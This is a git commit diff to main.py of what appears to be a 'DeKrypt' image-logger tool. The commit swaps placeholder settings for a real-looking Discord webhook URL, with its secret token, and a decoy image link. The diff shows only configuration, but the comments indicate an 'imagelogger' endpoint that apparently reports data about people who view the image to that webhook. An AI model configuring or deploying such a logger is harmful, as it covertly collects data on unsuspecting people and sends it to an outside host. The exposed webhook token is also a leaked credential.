3c4c2bdbcf0f978c5a8acabf5c072892025cd750
xxpogi <128472730+xxpogi@users.noreply.github.com>
2023-03-21 18:16:08 +0800

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1087676656438759424/umuWX5y9-NNDWVhKoc-ctUrFFGJM6jIiz6kY_Xf7WDXbSyRuNuco5kO1NocBuKu09CG8",
+    "image": "https://freepngimg.com/convert-png/98944-lmao-emoji-free-transparent-image-hd", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
